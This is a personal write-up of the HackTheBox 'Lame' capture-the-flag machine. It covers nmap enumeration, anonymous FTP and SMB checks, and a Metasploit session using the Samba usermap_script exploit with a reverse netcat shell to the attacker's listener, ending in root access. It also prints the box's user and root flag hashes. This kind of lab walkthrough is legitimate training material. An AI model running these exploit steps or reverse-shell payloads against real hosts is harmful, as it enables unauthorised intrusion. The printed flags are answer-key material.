---
title: "Lame"
date: 2020-11-14T19:52:15+01:00
draft: false
---

#### Machine Skills
---
This is a beginer box that I owned all you need to do is know how to use metaexploit

-----
#### Step 1 - Enumeration
-----
I started with a full port scan 

    start off with full port scan
    nmap -Pn -p - -oN fullport 10.10.10.3
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 09:09 EDT
    Nmap scan report for 10.10.10.3
    Host is up (0.087s latency).
    Not shown: 65530 filtered ports
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3632/tcp open  distccd

    Nmap done: 1 IP address (1 host up) scanned in 190.33 seconds

    nmap -Pn -sV -oN ~/Documents/HackTheBox/Lame_Box/svscan 10.10.10.3
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 09:14 EDT
    Nmap scan report for 10.10.10.3
    Host is up (0.096s latency).
    Not shown: 996 filtered ports
    PORT    STATE SERVICE     VERSION
    21/tcp  open  ftp         vsftpd 2.3.4
    22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                       
    445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                       
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 19.06 seconds

    nmap -Pn -p 21,22,139,445,3632 -sV -oN ~/Documents/HackTheBox/Lame_Box/svscan  10.10.10.3
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 09:17 EDT
    Nmap scan report for 10.10.10.3
    Host is up (0.10s latency).

    PORT     STATE SERVICE     VERSION
    21/tcp   open  ftp         vsftpd 2.3.4
    22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.81 seconds

I have found a number of ports open, of course I started with port 21 hoping I could send files there but I could not find anything of value there or I could now exploit it myself. 


    kali@kali:~$ ftp 10.10.10.3
    Connected to 10.10.10.3.
    220 (vsFTPd 2.3.4)
    Name (10.10.10.3:kali): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> pwd
    257 "/"
    ftp> ls -la
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
    drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
    226 Directory send OK.
    ftp> 





Next i took the time to learn what samba was.




    What is NetBIOS SSN?
    Description. This indicates an attempt to use the NetBIOS-SSN protocol. NetBIOS Session Service (NBSS) is a protocol to connect two computers to transmit heavy data traffic. It is mostly used for printer and file services over a network



    What Are Ports 139 And 445?
    SMB has always been a network file sharing protocol. As such, SMB requires network ports on a computer or server to enable communication to other systems. SMB uses either IP port 139 or 445.

    Port 139: SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network.
    Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet.
----
### Step 2 -Exploitation
---
After looking for something to use to exploit samba I started looking on searchsploit.

    kali:~$ smbclient -help
    Usage: smbclient [-?EgqBVNkPeC] [-?|--help] [--usage] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-M|--message=HOST]
            [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-m|--max-protocol=LEVEL] [-T|--tar=<c|x>IXFvgbNan]
            [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT]
            [-g|--grepable] [-q|--quiet] [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [-s|--configfile=CONFIGFILE]
            [-l|--log-basename=LOGFILEBASE] [-V|--version] [--option=name=value] [-O|--socket-options=SOCKETOPTIONS]
            [-n|--netbiosname=NETBIOSNAME] [-W|--workgroup=WORKGROUP] [-i|--scope=SCOPE] [-U|--user=USERNAME]
            [-N|--no-pass] [-k|--kerberos] [-A|--authentication-file=FILE] [-S|--signing=on|off|required]
            [-P|--machine-pass] [-e|--encrypt] [-C|--use-ccache] [--pw-nt-hash] service <password>
    kali@kali:~$ man smbclient
    smbclient -L 10.10.10.3
    protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED

    added client min protocol = NT1 to smb.conf
    added client max protocol = NT1 to smb.conf 

    smbclient -L 10.10.10.3
    Enter WORKGROUP\kali's password: 
    Anonymous login successful

            Sharename       Type      Comment
            ---------       ----      -------
            print$          Disk      Printer Drivers
            tmp             Disk      oh noes!
            opt             Disk      
            IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
            ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
    Reconnecting with SMB1 for workgroup listing.
    Anonymous login successful

            Server               Comment
            ---------            -------

            Workgroup            Master
            ---------            -------
            WORKGROUP            LAME


Sadly i did not find what I was looking for but I also tried metasploit just be sure 
----
### Step 3 - Foothold
---


    Matching Modules
    ================

    #   Name                                                   Disclosure Date  Rank       Check  Description
    -   ----                                                   ---------------  ----       -----  -----------
    0   auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
    1   auxiliary/admin/smb/samba_symlink_traversal                             normal     No     Samba Symlink Directory Traversal
    2   auxiliary/dos/samba/lsa_addprivs_heap                                   normal     No     Samba lsa_io_privilege_set Heap Overflow
    3   auxiliary/dos/samba/lsa_transnames_heap                                 normal     No     Samba lsa_io_trans_names Heap Overflow
    4   auxiliary/dos/samba/read_nttrans_ea_list                                normal     No     Samba read_nttrans_ea_list Integer Overflow
    5   auxiliary/scanner/rsync/modules_list                                    normal     No     List Rsync Modules
    6   auxiliary/scanner/smb/smb_uninit_cred                                   normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
    7   exploit/freebsd/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
    8   exploit/linux/samba/chain_reply                        2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
    9   exploit/linux/samba/is_known_pipename                  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
    10  exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
    11  exploit/linux/samba/setinfopolicy_heap                 2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
    12  exploit/linux/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
    13  exploit/multi/samba/nttrans                            2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
**14  exploit/multi/samba/usermap_script**                     2007-05-14       excellent  No     Samba "username map script" Command Execution

    15  exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
    16  exploit/osx/samba/trans2open                           2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
    17  exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
    18  exploit/solaris/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
    19  exploit/unix/http/quest_kace_systems_management_rce    2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
    20  exploit/unix/misc/distcc_exec                          2002-02-01       excellent  Yes    DistCC Daemon Command Execution
    21  exploit/unix/webapp/citrix_access_gateway_exec         2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
    22  exploit/windows/antivirus/symantec_rtvscan             2006-05-24       good       No     Symantec Remote Management Buffer Overflow
    23  exploit/windows/browser/dxstudio_player_exec           2009-06-09       excellent  No     Worldweaver DX Studio Player shell.execute() Command Execution
    24  exploit/windows/browser/getgodm_http_response_bof      2014-03-09       normal     No     GetGo Download Manager HTTP Response Buffer Overflow
    25  exploit/windows/fileformat/coolpdf_image_stream_bof    2013-01-18       normal     No     Cool PDF Image Stream Buffer Overflow
    26  exploit/windows/fileformat/ms14_060_sandworm           2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
    27  exploit/windows/ftp/globalscapeftp_input               2005-05-01       great      No     GlobalSCAPE Secure FTP Server Input Overflow
    28  exploit/windows/http/kaseya_uploadimage_file_upload    2013-11-11       excellent  Yes    Kaseya uploadImage Arbitrary File Upload
    29  exploit/windows/http/sambar6_search_results            2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
    30  exploit/windows/license/calicclnt_getconfig            2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
    31  exploit/windows/lpd/wincomlpd_admin                    2008-02-04       good       No     WinComLPD Buffer Overflow
    32  exploit/windows/smb/group_policy_startup               2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
    33  post/linux/gather/enum_configs                                          normal     No     Linux Gather Configurations


After looking through a lot of the exploits I started thinking methodically about it and looked athe the exploit description to see what I want. And I started to look for all the command execution scripts. There were 3 of them but luckly one of them worked the one that is highlighted. 

---
### Step 4 - Privilage Escalation
---

After using metasploit to select the correct exploit I was able to easily get root.

    msf5 exploit(multi/samba/usermap_script) > options 

    Module options (exploit/multi/samba/usermap_script):

    Name    Current Setting  Required  Description
    ----    ---------------  --------  -----------
    RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT   139              yes       The target port (TCP)


    Payload options (cmd/unix/reverse_netcat):

    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST  10.10.14.5       yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port


    Exploit target:

    Id  Name
    --  ----
    0   Automatic
    
    
    msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
    rhosts => 10.10.10.3
    
    
    
    options – shows the things we need to modify to make this exploit work
    rhosts – is your target host IP
    rport – target port, we will keep this default, but remember there is another samba client running on port 445, which we can also try if the default port doesn’t work.

    msf5 exploit(multi/samba/usermap_script) > exploit

    [*] Started reverse TCP handler on 10.10.14.5:4444 
    [*] Command shell session 1 opened (10.10.14.5:4444 -> 10.10.10.3:36884) at 2020-10-12 10:01:11 -0400

    whoami
    root
    pwd
    /


    cd ..
    cd home
    ls
    ftp
    makis
    service
    user
    cd makis
    ls
    user.txt
    cat user.txt
    69454a937d94f5f0225ea00acd2e84c5
    cd ..
    cd ..
    cd root
    ls
    Desktop
    reset_logs.sh
    root.txt
    vnc.log
    cat root.txt
    92caac3be140ef409e45721348a4e9df